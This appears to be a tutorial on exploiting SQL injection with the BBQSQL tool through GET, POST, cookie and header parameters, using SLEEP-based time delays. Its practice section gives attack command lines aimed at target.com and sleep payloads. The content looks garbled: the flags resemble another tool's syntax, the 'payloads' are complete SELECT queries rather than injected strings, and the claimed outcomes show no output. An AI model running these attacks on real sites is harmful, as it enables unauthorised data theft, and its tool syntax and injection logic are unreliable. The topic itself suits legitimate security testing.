# Usage Examples

## Context

This article demonstrates practical usage examples of BBQSQL, a tool used for exploiting SQL injection vulnerabilities in web applications. The methods covered include GET, POST, cookie, and header injection, including the use of sleep-based payloads to confirm vulnerabilities. Assumed knowledge includes understanding of HTTP methods, SQL query structures, HTTP headers, and basic SQL injection techniques.

## Theory

### GET Injection with BBQSQL

GET injections involve identifying parameters within the URL of a GET request that can be manipulated to exploit SQL injection vulnerabilities.

- **Identify Vulnerable GET Parameter**: Determine which URL parameters might be susceptible to SQL injection.
- **Configure BBQSQL with Target URL and Parameter**: Set up BBQSQL to target the identified parameter for an injection test.
- **Craft SQL Payload for Data Extraction**: Use an SQL payload designed to extract information by exploiting the vulnerability.

### POST Injection with BBQSQL

In POST injection, the data sent via HTTP POST requests are targeted for injection.

- **Identify Vulnerable POST Parameter**: Look for parameters in a POST request that might be vulnerable to SQL injection.
- **Set BBQSQL to Use POST Method**: Configure BBQSQL to specifically target POST requests with potential injections.
- **Design Payload to Exploit SQL Injection**: Create a payload that exploits the SQL injection vulnerability and retrieves data.

### Cookie Injection with BBQSQL

Cookies sometimes hold parameters vulnerable to SQL injection.

- **Detect SQL Injection in Cookie Value**: Examine cookie values for potential injection vulnerabilities.
- **Configure BBQSQL to Manipulate Cookies**: Use BBQSQL to target and manipulate cookie values directly.
- **Execute Payload to Retrieve Data**: Deploy payloads that exploit vulnerabilities in cookie values.

### Header Injection with BBQSQL

Injecting into HTTP headers exploits SQL vulnerabilities at the HTTP header level.

- **Find SQL Injection in HTTP Headers**: Identify headers that can be exploited for SQL injection.
- **Set BBQSQL to Inject into Headers**: Configure BBQSQL to use HTTP headers as the injection point.
- **Deploy Payload for Data Extraction**: Utilize payloads to extract data via header injection.

### Sleep Based Payloads

Sleep based payloads are used to confirm the presence of SQL injection by observing response delays.

- **Use Time Delays to Confirm Injection**: Implement payloads that cause the server to delay its response as a confirmation method.
- **Craft Payloads with SQL Sleep Functions**: Design your SQL payloads to include delay functions such as `SLEEP()`.

### Example Configurations

Predefined configurations make it easier to set up BBQSQL for common exploitation scenarios.

- **Predefined BBQSQL Configurations for Common Scenarios**: Utilize standard configurations to speed up setup.
- **Modify Configurations for Specific Targets**: Adapt configurations for the specific database schema of your target.

### Template Queries

SQL template queries offer a reusable approach for repeated tasks.

- **Reusable SQL Templates for BBQSQL**: Use predefined SQL templates for common querying tasks.
- **Adapt Templates to Target Database Schema**: Modify these templates to fit the target databaseâ€™s schema effectively.

### Payload Debugging

Essential for ensuring payload execution without errors.

- **Identify and Fix Payload Errors**: Use BBQSQL's debugging features to identify and correct issues in payloads.
- **Use BBQSQL Debugging Features**: Leverage built-in tools for troubleshooting payload execution.

### Timing Confirmation

Analyzing response times confirms successful injection.

- **Verify Successful Injection via Response Times**: Use the delay in response times as a metric for confirmation.
- **Analyze Timing Data to Confirm SQL Injection**: Look at the timing data provided by BBQSQL to validate your injection success.

## Practice

### GET Injection with BBQSQL

- **Configure BBQSQL**:
  
  ```bash
  bbqsql -u 'http://target.com/page?param=1' --method GET --param param --technique B --threads 5 --verbose --proxy http://127.0.0.1:8080
  ```

- **Use Sleep-Based Payload**:

  ```sql
  SELECT * FROM users WHERE id=1 AND SLEEP(5)
  ```
  This payload leverages the SLEEP function to create a delay, confirming the presence of SQL injection by observing response delay.

*Outcome*: Extracted data from a vulnerable GET parameter.

### POST Injection with BBQSQL

- **Configure BBQSQL**:

  ```bash
  bbqsql -u 'http://target.com/login' --method POST --data 'username=admin&password=pass' --param password --technique B --threads 5 --verbose
  ```

- **Craft Payload**:

  ```sql
  SELECT * FROM users WHERE username='admin' AND password='pass' AND SLEEP(5)
  ```
  This payload targets a login form where the password field is vulnerable to SQL injection.

*Outcome*: Accessed sensitive data via POST parameter.

### Cookie Injection with BBQSQL

- **Configure BBQSQL**:

  ```bash
  bbqsql -u 'http://target.com/dashboard' --cookie 'session=abc123' --param session --technique B --threads 5 --verbose
  ```

- **Inject Payload**:

  ```sql
  SELECT * FROM sessions WHERE session_id='abc123' AND SLEEP(5)
  ```
  This injection occurs within the session cookie value.

*Outcome*: Retrieved data through cookie injection.

### Header Injection with BBQSQL

- **Configure BBQSQL**:

  ```bash
  bbqsql -u 'http://target.com/resource' --header 'User-Agent: Mozilla/5.0' --param User-Agent --technique B --threads 5 --verbose
  ```

- **Exploit Header**:

  ```sql
  SELECT * FROM logs WHERE user_agent='Mozilla/5.0' AND SLEEP(5)
  ```
  Investigates SQL injection within the User-Agent header.

*Outcome*: Extracted information via header injection.
